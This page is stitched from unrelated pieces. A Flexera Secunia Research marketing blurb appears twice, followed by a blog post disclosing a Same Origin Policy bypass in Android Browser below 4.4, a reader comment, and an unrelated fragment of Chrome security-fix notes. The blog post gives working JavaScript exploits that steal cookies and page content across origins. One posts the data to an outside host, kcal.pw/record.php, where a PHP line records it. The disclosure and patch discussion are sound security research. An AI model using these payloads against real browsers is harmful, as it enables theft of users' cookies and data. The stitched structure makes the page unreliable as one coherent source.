How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# A Tale Of Another SOP Bypass In Android Browser < 4.4

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfvgyfHGKRcenjfnCPhmNBDkYB3CJcBfVh2_pittlG_KS-OfLxsnewYKauYxHfVLwPibMrZgUKimwRCFZnotrLLyQRirKhn-R6cDDkxpRIeBjCsNIAsstm93S43xUuo6OEO1dAAWKoMmM/s1600/Pirate.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfvgyfHGKRcenjfnCPhmNBDkYB3CJcBfVh2_pittlG_KS-OfLxsnewYKauYxHfVLwPibMrZgUKimwRCFZnotrLLyQRirKhn-R6cDDkxpRIeBjCsNIAsstm93S43xUuo6OEO1dAAWKoMmM/s1600/Pirate.jpg)

Since, my recent [android SOP bypass [CVE-2014-6041]](http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html) triggered a lot of eruption among the infosec community, I was motivated to research a bit more upon the android browser, it turns out that things are much worse than I thought, I managed to trigger quite a few interesting vulnerabilities inside of Android browser, one of them being another Same Origin Policy Bypass vulnerability. The thing that makes it worse was the same SOP bypass was already [fixed](http://trac.webkit.org/changeset/96826) inside of chrome years ago, however the patches were not applied to Android browser < 4.4.

#### Proof Of Concept

The following is the proof of concept:

<script>

window.onload = function()

{

    object = document.createElement("object");

    object.setAttribute("data", "http://www.bing.com");

    document.body.appendChild(object);

    object.onload = function() {

      object.setAttribute("data", "javascript:alert(document.domain)");

        object.innerHTML = "foobar";

    }

}

</script>

The POC is very easy to understand for individuals having some javaScript background. However, for others let me break it down for you. The above code creates an object with data attribute, which loads up a URL from another origin in this case "**http://www.bing.com**", however once it's loaded, we replace bing.com with "javascript:alert(document.domain)". The interesting thing here is that the last line is essential for the POC to work **object.innerHTML = "foobar";** so that the navigation request is performed

Let's take a look at the vulnerable code that is responsible for the causing the issue:
#### Vulnerable Code

bool HTMLPlugInImageElement::allowedToLoadFrameURL(const String& url)

{

    ASSERT(document());

    ASSERT(document()->frame());

    if (document()->frame()->page()->frameCount() >= Page::maxNumberOfFrames)

        return false;

    **KURL completeURL = document()->completeURL(url);**

The above function is responsible for loading up the frame URL, if you take a close look at the code, you would find out that there is no validation for javascript scheme, which allows us to execute javaScript in context of the frame that was loaded.
#### The fix

The issue was [fixed](https://android.googlesource.com/platform/external/webkit/%2B/109d59bf6fe4abfd001fc60ddd403f1046b117ef%5E%21/#F0) by applying the following checks from **securityorigin.h** library.

  if (contentFrame() && protocolIsJavaScript(completeURL)

       && !document()->securityOrigin()->canAccess(contentDocument()->securityOrigin()))

       return false;
#### Proof Of Concept Using Postmessage Call

To help understand the vulnerability better and get to the root cause, i contacted Joe Vennix from metasploit team, who modified my original POC to the following to help demonstrate the vulnerability in an effective manner. The following POC uses postMessage call from HTML 5 world to send the document.cookie and innerHTML to the main window.

<script>

window.onload = function()

{

    object = document.createElement("object");

    object.setAttribute("data", "http://www.bing.com");

    document.body.appendChild(object);

    object.onload = function() {

        object.data = "javascript:var t=top;with(document)t.postMessage('HTML='+body.innerHTML+'&COOKIE='+cookie,'\*');";

        object.innerHTML = "foobar";

    }

}

window.onmessage = function(m){

  alert(m.data);

}

</script>

#### Proof Of Concept To Steal Data Across Domains

A great friend of mine @filedescriptor helped me with the following POC, which steals data from bing.com by accessing the document.body.innerHTML property as submits that data cross origin by using a POST request, since you can send limited amount of data with GET due to browser restrictions.

<script>

window.onload = function()

{

object = document.createElement("object");

object.setAttribute("data", "http://www.bing.com");

document.body.appendChild(object);

object.onload = function() {

object.data = "javascript:with(document)body.innerHTML+='<form method=post action=//kcal.pw/record.php?name=\_\_target=\_><input name=content></form><iframe name=\_>',\_\_.content.value=body.innerHTML,\_\_.submit()";

object.innerHTML = "foobar";

}

}

The PHP file hosted at record.php contains the following line, which saves the data coming from bing.com to a file called record.txt.

**file\_put\_contents('record.txt', $\_POST['content']);**

The following are some of the handsets that we used to test and verify this vulnerability.

#### In Closing

There are tons of other browsers with huge userbase that are vulnerable to same vulnerability, Maxthon, CM Browser, Safari Browser 5.0 to name a few. In case if you are still using Android browser or any of other browser, you should immediately apply patches or switch to Chrome or firefox. I believe there are several other vulnerabilities that were addresses in chrome webkit and still have not been addressed inside of Android browser, therefore it is recommended to avoid it completely.

   Nice one! Congrats Rafay!

   May I ask why is object.innerHTML = "foobar" essential for the POC to work ?
   Why is CHANGING the content of the page essential for the first POC? How does this help us? Or is does more than just changing the content?

Security fixes and rewards:

The bugs [[94487](http://code.google.com/p/chromium/issues/detail?id=94487)], [[96292](http://code.google.com/p/chromium/issues/detail?id=96292)], [[96902](http://code.google.com/p/chromium/issues/detail?id=96902)], [[97599](http://code.google.com/p/chromium/issues/detail?id=97599)], [[98064](http://code.google.com/p/chromium/issues/detail?id=98064)], [[98556](http://code.google.com/p/chromium/issues/detail?id=98556)], [[99294](http://code.google.com/p/chromium/issues/detail?id=99294)], [[100059](http://code.google.com/p/chromium/issues/detail?id=100059)], [[99138](http://code.google.com/p/chromium/issues/detail?id=99138)] and [[99211](http://code.google.com/p/chromium/issues/detail?id=99211)] were detected using [AddressSanitizer](http://code.google.com/p/address-sanitizer/wiki/AddressSanitizer).

Although Chrome is not directly affected by the attack, the NSS network library was updated to include a defense against so-called BEAST. This defense may expose bugs in Brocade hardware. Brocade is working on the issue. The lighttpd project fixed a compatibility issue at version 1.4.27 and newer.

In addition, we would like to thank Sławomir Błażek and Aki Helin of OUSPG for working with us in the development cycle and preventing bugs from ever reaching the stable channel. Various rewards were issued.
